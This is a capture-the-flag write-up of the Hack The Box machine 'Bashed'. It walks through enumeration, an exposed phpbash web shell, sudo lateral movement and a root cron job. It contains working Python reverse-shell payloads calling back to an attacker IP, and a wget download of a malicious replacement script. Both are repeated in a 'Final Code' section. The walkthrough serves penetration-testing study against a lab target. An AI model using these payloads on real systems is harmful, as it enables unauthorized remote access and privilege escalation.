# Bashed - HTB

Bashed - 10.10.10.68

![](/images/bashed/1. bashed.png "Bashed Info Card")

Contents:

1. TOC
{:toc}

<p>&nbsp;</p>
=======================================================

## Introduction

=======================================================

Bashed is a Hack the Box example of system misconfigurations which allow a remote attacker to gain access and escalate to root privileges. The screenshots for this write-up were captured on 7 May 2020 as I completed the machine. This is useful to remember a bit later in the write-up as you will see. Of note, there is no need for Metasploit as everything can be done with fairly simple linux and python commands which makes this a perfect machine to attempt when just starting out.

<p>&nbsp;</p>
=======================================================

## Tools & Techniques Used

=======================================================

Bashed has an open web shell (misconfiguration #1) which allows us to spawn an interactive shell. From the interactive shell we can use sudo to move laterally to another user (misconfiguration #2). As the second user, we enumerate interesting files and discover we can modify a python script which is executed periodically by a cron job running as root (misconfiguration #3). Modifying the python script allows us to obtain a root shell.

-1- nmap

-2- dirbuster

-3- php web shell

-4- python reverse shell

-5- nc

-6- sudo -u

-7- python script modification for a second reverse shell

<p>&nbsp;</p>
=======================================================

## Scanning and Enumeration

=======================================================

We start with a basic nmap scan to see what ports are open and services are available:

    nmap -A -T4 10.10.10.68

![](/images/bashed/2. nmap.png "nmap")

Port 80 is open running Apache 2.4.18, looks like on Ubuntu.

Let's visit the web site and see what we have! : http://10.10.10.68

![](/images/bashed/3. website.png "website")

So we have a blog entry telling us Arrexel developed “phpbash” on this server, and that phpbash is useful for pentesting!

No other real hints in the page source or links.

Let's fire up dirbuster and do some enumeration.

    dirbuster &

![](/images/bashed/4. dirbuster_1.png "dirbuster")

Fill in the options as you see above. Since the site talks about “phpbash”, I went with File Extension php and the medium wordlist. On Kali linux, this wordlist should be pre-installed at /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt. I also clicked the "Go Faster" button to increase the speed of directory busting.

Once all of your options match those shown, click Start

You only need to let this run for a minute or so, then switch to the “Results - Tree View” tab:

![](/images/bashed/5. dirbuster_2.png "dirbuster")

Here you can click through different folders that Dirbuster has found.  Remember how the blog entry said Arrexel developed phpbash on this very server?  Click on the “dev” folder.  

![](/images/bashed/6. dirbuster_3.png "dirbuster")

Looks like we have a couple of the phpbash files to go look at!  Let's browse to it: http://10.10.10.68/dev

![](/images/bashed/7. dev.png "dev")

Note, we have the webserver telling us it is Apache 2.4.18 Ubuntu just like our nmap results.

Click on phpbash.php

![](/images/bashed/8. phpbash.png "phpbash")

And we are greeted with what looks like a terminal window. Let's see what we can do:

    whoami

    pwd

    ls

![](/images/bashed/9. phpbash_2.png "phpbash")

Okay, so we have code execution as a low-privileged user, but this is not the smoothest of interfaces. Perhaps we can use a bash one-liner to trigger a reverse tcp shell?  


<p>&nbsp;</p>
=======================================================

## Exploitation using Metasploit

=======================================================

None!  This box is an example of purely manual enumeration and exploitation.  Have fun!


<p>&nbsp;</p>
=======================================================

## Manual Exploitation

=======================================================

Let's Google bash one-liner reverse shells:

![](/images/bashed/10. google.png "google")

This pentestmonkey site is a favorite: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

![](/images/bashed/11. pentestmonkey.png "pentestmonkey")

This python reverse shell is also a favorite, so on our Kali machine, let's set up a nc listener to catch the connection:

    nc -lvnp 17011

![](/images/bashed/12. nc_listener.png "nc listener")

Then in the phpbash window:

    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.24",17011));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

A note here: Bashed is an older machine so it is fine to default to using "python" which is normally symlinked to python2. In newer machines you will want to specify "python3" instead as python2 is deprecated. 

![](/images/bashed/13. nc_connection.png "nc connection")

We have a shell! Let's check if we can sudo anything:

![](/images/bashed/14. sudo-l.png "sudo -l")

And we can! We can run any command as the user scriptmanager without a password. A dangerous misconfiguration for sure. Since user scriptmanager probably has more permissions than user www-data, let's log ourselves in as scriptmanager:

    sudo -u scriptmanager bash -i

This command tells the system we want to run the command "bash -i", or bash in interactive mode, as the user scriptmanager. If it works it should give us a bash prompt as scriptmanager:

![](/images/bashed/15. sudo-u.png "sudo -u")

Looks good! Let's see what else we can find in our home folder.

    cd /home/scriptmanager

    ls -la

![](/images/bashed/16. enum.png "enum")

Nothing interesting here. Let's check the / directory:

    ls /

![](/images/bashed/17. enum_2.png "enum")

Okay, so we are a user scriptmanager, and in the / directory there is a “scripts” folder which is not a default directory on linux. Let's check it out!

    cd scripts

    ls -la

![](/images/bashed/18. enum_3.png "enum")

test.py and test.txt. test.txt has a date/timestamp of just a moment ago at 14:03 on 7 May.  Let's see what is in test.txt and test.py:

    cat test.txt

    cat test.py

![](/images/bashed/19. test.txt.png "test.txt")

The text “testing 123!” is in test.txt. The test.py file opens the test.txt and overwrites it with “testing 123!”

But test.txt is owned by the root user, and again that timestamp was from right about the same time we ran the “ls -la” command.  Let's wait a minute and run ls -la again:

    ls -la

![](/images/bashed/20. enum_4.png "enum")

test.txt has a new timestamp of 14:07, meaning there is a cron job or some scheduled task that is running test.py every minute or so. Since user scriptmanager owns test.py, we can modify test.py and when the cron job runs as root we can gain a root shell!

On my Kali machine I created a new python file and put this code in it:

test.py:

    import socket,subprocess,os
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("10.10.14.24",17012))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p=subprocess.call(["/bin/bash","-i"])

Then I ran python's HTTP server:

    python -m SimpleHTTPServer 8080

Over on bashed I ran a wget command to download the test.py file to bashed:
    
    wget http://10.10.14.24:8080/test.py

![](/images/bashed/21. wget.png "wget")

Next I set up a nc listener on Kali to catch the connection:

    nc -lvnp 17012

Then we need to replace the old test.py with our new test.py.1:

    mv test.py.1 test.py

![](/images/bashed/22. mv_test.py.1.png "mv test.py.1")

Now we wait a minute and in our Kali nc listener we should see:

![](/images/bashed/23. nc_listener_2.png "nc connection")

    whoami

![](/images/bashed/24. whoami.png "whoami")

Success! We are root.  Now let's get our flags:

    cat /home/arrexel/user.txt

    cat /root/root.txt

![](/images/bashed/25. flags.png "flags")

And there we have our flags.

<p>&nbsp;</p>
=======================================================

## Final Code

=======================================================

one-line python2 reverse shell: 

    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.24",17011));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

test.py:

    import socket,subprocess,os
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("10.10.14.24",17012))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p=subprocess.call(["/bin/bash","-i"])

<p>&nbsp;</p>
=======================================================

## Links & Additional Reading

=======================================================

1. Pentestmonkey revserse shell cheatsheet: [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
2. Online sudo manual: [https://www.sudo.ws/man/1.8.14/sudo.man.html](https://www.sudo.ws/man/1.8.14/sudo.man.html)

<p>&nbsp;</p>
=======================================================

![rax logo](/images/rax_intel.png)

<p>&nbsp;</p>
